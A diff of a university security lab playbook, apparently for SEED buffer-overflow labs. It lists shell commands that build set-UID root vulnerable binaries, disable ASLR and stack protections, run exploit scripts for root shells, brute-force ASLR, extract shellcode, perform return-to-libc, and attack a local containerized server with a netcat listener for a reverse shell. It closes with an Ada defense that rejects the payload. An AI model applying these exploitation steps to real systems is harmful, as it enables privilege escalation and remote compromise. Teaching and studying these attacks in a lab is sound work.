@@ -1,6 +1,118 @@
-# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E5/T5 + E7/T7 + E9/T8)
+# CEG4799/CSI4539 Lab 2 - Track 1 Demo Playbook (E1/T1 -> E9/T8)
 # Working directory for all commands unless stated otherwise:
-cd /home/seed/Documents/Laboratoire_CSI4539
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+
+
+# ==================================================
+# TA DEMO ONLY (SHORT PATH - RUN IN THIS ORDER)
+# ==================================================
+# This block is the minimal live-demo flow to avoid getting lost.
+# Deep evidence/analysis commands stay in later sections.
+
+# D0) Build baseline binaries + deterministic addresses.
+make stack-L1 stack-L2 stack-L3
+ls -l stack-L1 stack-L2 stack-L3
+file stack-L1 stack-L2 stack-L3
+sudo sysctl -w kernel.randomize_va_space=0
+
+# D1) E1/T1 quick proof (stack layout + exact overwrite offset).
+python3 -c 'open("badfile","wb").write(b"A"*32)'
+gdb -q -batch \
+	-ex 'set pagination off' \
+	-ex 'b bof' \
+	-ex 'run' \
+	-ex 'next' \
+	-ex 'printf "E1_EBP=0x%x\n", $ebp' \
+	-ex 'printf "E1_BUFFER=0x%x\n", &buffer' \
+	-ex 'printf "E1_RET_SLOT=0x%x\n", $ebp+4' \
+	-ex 'printf "E1_DISTANCE=%d\n", (int)((char*)($ebp+4) - (char*)&buffer)' \
+	./stack-L1-dbg
+
+# D2) E2/T2 quick proof (shellcode harnesses).
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/shellcode
+make clean
+make
+file a32.out a64.out
+# If ./a32.out fails on this VM, still show a64.out plus E2 evidence section below.
+./a32.out
+./a64.out
+
+# D3) E3/T3 quick proof (L1/L2/L3 root shell results).
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+python3 exploit.py
+cp badfile badfile-t3
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1
+
+# Build Level-2 boundary targets required by T3 acceptance.
+gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L2-100 stack.c
+gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -m32 -o stack-L2-200 stack.c
+sudo chown root stack-L2-100 stack-L2-200
+sudo chmod 4755 stack-L2-100 stack-L2-200
+
+python3 exploit_l2.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L2-100
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L2-200
+
+python3 exploit_l3.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L3
+
+# D4) E4/T4 quick proof (dash/ASLR/canary/NX).
+sudo ln -sf /bin/dash /bin/sh
+python3 exploit.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1
+
+python3 exploit_l1_setuid.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1
+sudo ln -sf /bin/zsh /bin/sh
+
+sudo sysctl -w kernel.randomize_va_space=2
+./brute-force-aslr.sh 80000
+sudo sysctl -w kernel.randomize_va_space=0
+
+gcc -DBUF_SIZE=100 -m32 -z execstack -fstack-protector -o stack-L1-canary stack.c
+sudo chown root stack-L1-canary
+sudo chmod 4755 stack-L1-canary
+python3 exploit.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1-canary
+
+gcc -DBUF_SIZE=100 -m32 -z noexecstack -fno-stack-protector -o stack-L1-nx stack.c
+sudo chown root stack-L1-nx
+sudo chmod 4755 stack-L1-nx
+python3 exploit.py
+printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1-nx
+
+# D5) E5/T5 quick proof (ret2libc).
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Return_to_Libc_Labsetup
+script -q -c "./T5.sh" ../traces/T5-retlib.log
+
+# D6) E7/T7 quick proof (Ada rejects T3 payload safely).
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+gprbuild -P lab2_defense.gpr
+./main badfile-t3
+
+# D7) E9/T8 quick proof (remote server exploit).
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server/server-code
+make clean && make && make install
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server
+docker-compose build && docker-compose up -d && docker-compose ps
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*8)' | nc -w 1 10.9.0.5 9090 || true
+docker logs --tail 20 server-1-10.9.0.5
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server/attack-code
+# replace 0xffffd230 with current (buffer + 0xc8) from logs if needed
+python3 exploit.py 0xffffd230
+# Terminal A: nc -lvnp 7070
+# Terminal B: cat badfile | nc -w 1 10.9.0.5 9090
+
+# D8) Final reset.
+sudo ln -sf /bin/zsh /bin/sh
+sudo sysctl -w kernel.randomize_va_space=0
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup_Server
+docker-compose down
+
+
+# ==================================================
+# FULL EVIDENCE / REPORT DETAILS (LONG PATH)
+# ==================================================
 
 # -----------------------------
 # 0) Baseline setup and checks
@@ -23,13 +135,93 @@ sysctl kernel.randomize_va_space
 # Position for E1/T1 commands:
 cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
 
-# Measure exact overflow geometry for Level-1 in a reproducible way.
-# t1.gdb prints: &buffer, ebp, return-slot address, and offset.
-gdb -q -batch -x t1.gdb ./stack-L1-dbg
+# Requirement reminder (E1): compile 32-bit Set-UID root vulnerable binary,
+# then locate buffer, saved frame pointer, and return slot in gdb, and compute
+# exact distance from buffer start to return address.
+
+# Rebuild exactly as requested for E1 (32-bit, executable stack, no canary).
+gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -o stack-L1 stack.c
+gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -g -o stack-L1-dbg stack.c
+sudo chown root stack-L1
+sudo chmod 4755 stack-L1
+ls -l stack-L1 stack-L1-dbg
+file stack-L1 stack-L1-dbg
+
+# t1.gdb runs stack-L1-dbg, which reads input from ./badfile.
+# Create a short benign file so E1 measurement works on a clean checkout.
+python3 -c 'open("badfile","wb").write(b"A"*32)'
+
+# Measure exact overflow geometry with the explicit required gdb steps:
+# b bof, next, p $ebp, p &buffer.
+# Also compute return-slot and exact distance to return address.
+mkdir -p /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces
+gdb -q -batch \
+	-ex 'set pagination off' \
+	-ex 'b bof' \
+	-ex 'run' \
+	-ex 'next' \
+	-ex 'printf "E1_EBP=0x%x\n", $ebp' \
+	-ex 'printf "E1_BUFFER=0x%x\n", &buffer' \
+	-ex 'printf "E1_RET_SLOT=0x%x\n", $ebp+4' \
+	-ex 'printf "E1_DISTANCE=%d\n", (int)((char*)($ebp+4) - (char*)&buffer)' \
+	-ex 'p/x $ebp' \
+	-ex 'p/x &buffer' \
+	-ex 'p/x $ebp+4' \
+	-ex 'p/d (int)((char*)($ebp+4) - (char*)&buffer)' \
+	-ex 'x/2wx $ebp' \
+	./stack-L1-dbg | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T1-stack-layout.log
+
+# Print readable mapping in terminal so values are directly interpretable.
+E1_EBP=$(grep -m1 '^E1_EBP=' /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T1-stack-layout.log | cut -d= -f2)
+E1_BUFFER=$(grep -m1 '^E1_BUFFER=' /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T1-stack-layout.log | cut -d= -f2)
+E1_RET_SLOT=$(grep -m1 '^E1_RET_SLOT=' /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T1-stack-layout.log | cut -d= -f2)
+E1_DISTANCE=$(grep -m1 '^E1_DISTANCE=' /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T1-stack-layout.log | cut -d= -f2)
+
+echo
+echo '========== E1 INTERPRETATION =========='
+echo "buffer address      (&buffer)   = ${E1_BUFFER}"
+echo "frame pointer       (ebp)       = ${E1_EBP}"
+echo "return-address slot (ebp + 4)   = ${E1_RET_SLOT}"
+echo "offset to overwrite RET         = ${E1_DISTANCE} bytes"
+echo
+cat <<'EOF'
+Terminology and why it matters for exploitation:
+- buffer: local array in bof(); overflow starts here.
+- ebp (frame pointer): anchor for current stack frame.
+  In 32-bit calling convention:
+  * [ebp]     holds saved caller EBP
+  * [ebp + 4] holds saved return address (RET target)
+- return-address slot: value CPU jumps to when bof() executes ret.
+
+How we use this for the attack:
+1) Fill payload with NOP/shellcode and padding.
+2) At exact offset "distance" (here E1_DISTANCE), overwrite saved RET.
+3) Set overwritten RET to point into our payload (NOP sled/shellcode).
+4) When bof() returns, control flow is redirected to attacker-controlled code.
+EOF
+
+# Optional interactive equivalent (same required sequence):
+# gdb ./stack-L1-dbg
+# (gdb) b bof
+# (gdb) run
+# (gdb) next
+# (gdb) p $ebp
+# (gdb) p &buffer
+# (gdb) p $ebp+4
+# (gdb) p/d (int)((char*)($ebp+4) - (char*)&buffer)
 
 # Expected:
 # - offset to saved return is the calibrated value used by exploit.py
 # - values are used as evidence in report/demo.
+# - T1-stack-layout.log is the trace artifact to show the TA.
+
+# Document stack layout (schema to include in report), using values read above:
+# [higher addr]
+# saved RET @ ($ebp + 4)    <-- overwrite target
+# saved EBP @ ($ebp)
+# local buffer @ &buffer
+# [lower addr]
+# distance = (saved RET) - (&buffer)
 
 
 # ----------
@@ -48,6 +240,32 @@ file a32.out a64.out
 ./a32.out
 ./a64.out
 
+# Low-level extraction required by E2 (source -> asm -> machine code).
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup
+nasm -f elf64 hello.s -o hello.o
+ld hello.o -o hello
+./hello
+
+nasm -f elf64 mysh64.s -o mysh64.o
+ld mysh64.o -o mysh64
+nasm -f elf64 another_sh64.s -o another_sh64.o
+ld another_sh64.o -o another_sh64
+
+# Disassembly and raw bytes (objdump/xxd), then conversion helper.
+objdump -Mintel -d mysh64.o | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T2-mysh64-objdump.txt
+objdump -Mintel -d another_sh64.o | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T2-another_sh64-objdump.txt
+objcopy -O binary -j .text mysh64.o mysh64.text.bin
+objcopy -O binary -j .text another_sh64.o another_sh64.text.bin
+xxd -g1 mysh64.text.bin | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T2-mysh64-xxd.txt
+xxd -g1 another_sh64.text.bin | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T2-another_sh64-xxd.txt
+
+# Null-byte check (E2 requirement: remove/avoid 0x00 in shellcode bytes).
+if xxd -p mysh64.text.bin | tr -d '\n' | grep -qi '00'; then echo 'mysh64: has null bytes'; else echo 'mysh64: no null bytes'; fi
+if xxd -p another_sh64.text.bin | tr -d '\n' | grep -qi '00'; then echo 'another_sh64: has null bytes'; else echo 'another_sh64: no null bytes'; fi
+
+# convert.py helper (paste xxd -p output into ori_sh when preparing final shellcode literal).
+python3 convert.py
+
 # Return to overflow code directory for E3 onward.
 cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
 
@@ -60,7 +278,7 @@ readlink -f /bin/sh
 # E3/T3 - Level 1
 # ----------------
 # Position for E3/T3 commands:
-cd /home/seed/Documents/Laboratoire_CSI4539/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
 
 # Generate Level-1 payload (offset=112, ret calibrated for this VM).
 python3 exploit.py
@@ -176,7 +394,7 @@ printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1-nx
 # ----------------
 # Run the current E5 script. It builds retlib/prtenv, gets the runtime addresses,
 # generates badfile with exploit_script.py, and launches retlib.
-cd /home/seed/Documents/Laboratoire_CSI4539/lab2/Return_to_Libc_Labsetup
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Return_to_Libc_Labsetup
 mkdir -p ../traces
 script -q -c "./T5.sh" ../traces/T5-retlib.log
 
@@ -184,18 +402,102 @@ script -q -c "./T5.sh" ../traces/T5-retlib.log
 # Acceptance check: id must report euid=0(root); otherwise E5 has not passed.
 # The trace records the addresses and interactive result without committing binaries.
 
+# E5 variation A: exit() necessary?
+# Recompute addresses, set exit address to 0, regenerate badfile, and rerun retlib.
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Return_to_Libc_Labsetup
+export MYSHELL=/bin/sh
+SH_ADDR=$(./prtenv | awk '/Address:/{print "0x"$2}')
+SYS_ADDR=$(gdb -q -batch -ex 'p system' ./retlib | awk '/system>/{print $NF}')
+python3 exploit_script.py "$SH_ADDR" "$SYS_ADDR" 0x0
+./retlib
+
+# E5 variation B: effect of binary name change on /bin/sh address.
+cp retlib retlib2
+cp prtenv prtenv2
+SH2_ADDR=$(./prtenv2 | awk '/Address:/{print "0x"$2}')
+SYS2_ADDR=$(gdb -q -batch -ex 'p system' ./retlib2 | awk '/system>/{print $NF}')
+EXIT2_ADDR=$(gdb -q -batch -ex 'p exit' ./retlib2 | awk '/exit>/{print $NF}')
+python3 exploit_script.py "$SH2_ADDR" "$SYS2_ADDR" "$EXIT2_ADDR"
+./retlib2
+
+
+# ------------------------------
+# E6/T6 - Source/Asm/Machine (L2-B)
+# ------------------------------
+# Position for E6/T6 commands:
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+mkdir -p /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces
+
+# Link vulnerable source to assembly/machine code and identify prologue/epilogue/ret.
+objdump -Mintel -d stack-L1-dbg | sed -n '/<bof>:/,+60p' | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-bof-default.asm
+
+# Compare at least two options and document impact on attack feasibility.
+gcc -DBUF_SIZE=100 -m32 -z execstack -fstack-protector -g -o stack-L1-ssp stack.c
+objdump -Mintel -d stack-L1-ssp | sed -n '/<bof>:/,+80p' | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-bof-ssp.asm
+
+gcc -DBUF_SIZE=100 -m32 -z noexecstack -fno-stack-protector -g -o stack-L1-noexec stack.c
+objdump -Mintel -d stack-L1-noexec | sed -n '/<bof>:/,+60p' | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-bof-noexec.asm
+
+# PT_GNU_STACK flags show executable vs non-executable stack policy.
+readelf -W -l stack-L1-dbg | grep -A1 GNU_STACK | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-stackflag-exec.txt
+readelf -W -l stack-L1-noexec | grep -A1 GNU_STACK | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-stackflag-noexec.txt
+
+# Tie E2 shellcode assembly to machine code artifacts for T6 evidence.
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Labsetup
+objdump -Mintel -d mysh64.o | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-mysh64-objdump.txt
+xxd -g1 mysh64.text.bin | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T6-mysh64-xxd.txt
+
+
+# ------------------------------
+# E8 - Properties and legacy corpus (documentation)
+# ------------------------------
+# E8 has no separate live exploit test; produce explicit properties + corpus files.
+mkdir -p /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus
+
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/E8-properties.md <<'EOF'
+Property P1 (length domain): input_length <= buffer_length
+Property P2 (index bound): every write index i satisfies 1 <= i <= buffer_length
+Property P3 (buffer invariant): no write occurs outside constrained buffer subtype
+Property P4 (safe failure): out-of-range input raises handled Constraint_Error
+EOF
+
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/01-overflow-A517.txt <<'EOF'
+Payload length 517 with return overwrite pattern
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/02-overflow-small-buffer.txt <<'EOF'
+Payload targeting BUF_SIZE=10 variant
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/03-nul-byte-address-64bit.txt <<'EOF'
+Address with embedded 0x00 for 64-bit constraints
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/04-ret2libc-system-exit-sh.txt <<'EOF'
+ret2libc triple pointer layout (system, exit, /bin/sh)
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/05-ret2libc-no-exit.txt <<'EOF'
+ret2libc variation with exit pointer set to 0
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/06-binary-rename-env-shift.txt <<'EOF'
+ret2libc variation after binary rename, environment address shift
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/07-remote-ret-calibration.txt <<'EOF'
+Remote server payload requiring ret = buffer + shellcode_offset
+EOF
+cat > /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/e8-corpus/08-aslr-bruteforce-window.txt <<'EOF'
+ASLR brute-force range/step attack configuration
+EOF
+
 
 # ----------------
 # E7/T7 - Ada defense
 # ----------------
 # Reuse the exact Level-1 T3 input saved above as badfile-t3.
-cd /home/seed/Documents/Laboratoire_CSI4539/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
+cd /home/seed/Documents/Laboratoire/lab1_v2/lab2/Buffer_Overflow_Setuid_Labsetup/Labsetup/code
 test -s badfile-t3
 
 # Build the Ada defense and capture the replay result.
-mkdir -p obj ../../../traces
+mkdir -p obj /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces
 gprbuild -P lab2_defense.gpr
-./main badfile-t3 | tee ../../../traces/T7-ada.log
+./main badfile-t3 | tee /home/seed/Documents/Laboratoire/lab1_v2/lab2/traces/T7-ada.log
 
 # Expected: Constraint_Error is caught and the oversized T3 input is rejected safely.
 # Do not substitute the A*517 smoke-test file; E7 requires the same input as T3.
